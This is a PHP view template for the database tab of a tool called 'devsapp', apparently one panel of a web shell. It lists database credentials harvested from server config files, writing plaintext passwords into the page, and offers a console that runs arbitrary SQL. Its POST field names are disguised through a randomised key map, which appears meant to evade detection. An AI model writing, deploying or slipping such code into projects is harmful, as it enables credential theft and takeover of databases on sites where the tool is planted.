<?php
// +------------------------------------------------------------------+
// |  devsapp — views/tabs/tab_db.php                                  |
// |  Tab Database: discovered DB list + SQL console.                  |
// |  varnaming.md: semua field POST di-resolve via $_sk               |
// +------------------------------------------------------------------+
?>

<!-- ============================================================ -->
<!-- TAB 3: DATABASE MANAGER                                      -->
<!-- ============================================================ -->

<!-- Discovered Databases -->
<div class="card">
    <h3 style="margin-top:0; font-size:14px; color:var(--accent); text-transform:uppercase;">&gt; DISCOVERED DATABASES</h3>
    <?php if (empty($viewData['db']['databases'])): ?>
        <p style="color:var(--muted);">No auto-configured database credentials found.</p>
    <?php else: ?>
        <div style="overflow-x:auto;">
        <table>
            <thead>
                <tr>
                    <th>DATABASE</th><th>USER</th><th>HOST</th><th>CONFIG FILE</th><th>ACTION</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($viewData['db']['databases'] as $dbEntry): ?>
                <tr>
                    <td><b style="color:var(--good);"><?= h($dbEntry['name']) ?></b></td>
                    <td><?= h($dbEntry['user']) ?></td>
                    <td class="mono"><?= h($dbEntry['host']) ?></td>
                    <td class="mono" style="font-size:11px; color:var(--muted);"><?= h($dbEntry['file']) ?></td>
                    <td>
                        <button type="button" class="btn-sm"
                                onclick="fillDbForm('<?= h($dbEntry['host']) ?>', '<?= h($dbEntry['name']) ?>', '<?= h($dbEntry['user']) ?>', '<?= h($dbEntry['pass']) ?>')">
                            SELECT
                        </button>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        </div>
    <?php endif; ?>
</div>

<!-- Guard denied notice -->
<?php if ($viewData['guardDenied']): ?>
<div class="alert alert-error">
    <i class="fa-solid fa-ban"></i> Feature tidak tersedia dalam kondisi request saat ini.
</div>
<?php endif; ?>

<!-- SQL Console -->
<div class="card">
    <h3 style="margin-top:0; font-size:14px; color:var(--accent); text-transform:uppercase;">&gt; DIRECT SQL CONSOLE</h3>
    <form method="post">
        <input type="hidden" name="<?= h($_sk['do']) ?>" value="qr">
        <input type="hidden" name="<?= h($_sk['nv']) ?>" value="1">
        <input type="hidden" name="<?= h($_sk['lc']) ?>" value="<?= h($viewData['currentPath']) ?>">
        <input type="hidden" name="<?= h($_sk['md']) ?>" value="db">
        <input type="hidden" name="_ns" value="<?= h($viewData['nonce']) ?>">
        <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(180px, 1fr)); gap:10px; margin-bottom:10px;">
            <input type="text"     id="db_host" name="<?= h($_sk['dh']) ?>" placeholder="Host"          value="<?= h($viewData['db']['formVals']['host']) ?>" required>
            <input type="text"     id="db_name" name="<?= h($_sk['db']) ?>" placeholder="Database Name" value="<?= h($viewData['db']['formVals']['name']) ?>" required>
            <input type="text"     id="db_user" name="<?= h($_sk['du']) ?>" placeholder="User"          value="<?= h($viewData['db']['formVals']['user']) ?>" required>
            <input type="password" id="db_pass" name="<?= h($_sk['dp']) ?>" placeholder="DB Password"   value="<?= h($viewData['db']['formVals']['pass']) ?>">
        </div>
        <textarea name="<?= h($_sk['sq']) ?>" placeholder="SHOW TABLES;&#10;SELECT * FROM table LIMIT 10;" required style="height:120px;"><?= h($viewData['db']['formVals']['sql']) ?></textarea>
        <br><br>
        <button type="submit" class="btn-good" style="padding:8px 16px;">
            <i class="fa-solid fa-play"></i> EXECUTE_QUERY
        </button>
    </form>

    <!-- Query Result -->
    <?php if ($viewData['db']['result']): ?>
    <?php $dbR = $viewData['db']['result']; ?>
    <hr style="border-color:var(--line); margin:15px 0;">
    <h4 style="margin:0 0 10px; color:var(--accent); text-transform:uppercase;">QUERY OUTPUT:</h4>
    <?php if (!$dbR['success']): ?>
        <div class="alert alert-error">SQL_ERROR: <?= h($dbR['error']) ?></div>
    <?php elseif (isset($dbR['affected'])): ?>
        <div class="alert alert-success">QUERY SUCCESS. Affected rows: <?= (int)$dbR['affected'] ?></div>
    <?php elseif (!empty($dbR['data'])): ?>
        <div style="overflow-x:auto;">
            <table>
                <thead>
                    <tr>
                        <?php foreach (array_keys($dbR['data'][0]) as $col): ?>
                        <th><?= h($col) ?></th>
                        <?php endforeach; ?>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($dbR['data'] as $row): ?>
                    <tr>
                        <?php foreach ($row as $val): ?>
                        <td class="mono" style="font-size:11px;"><?= h((string)$val) ?></td>
                        <?php endforeach; ?>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    <?php else: ?>
        <div style="color:var(--muted)">Empty set (0 rows returned).</div>
    <?php endif; ?>
    <?php endif; ?>
</div>

<!-- JS fillDbForm helper: pakai ID yang stabil, bukan field name yang berubah -->
<script>
window.fillDbForm = function(host, name, user, pass) {
    document.getElementById('db_host').value = host;
    document.getElementById('db_name').value = name;
    document.getElementById('db_user').value = user;
    document.getElementById('db_pass').value = pass;
};
</script>
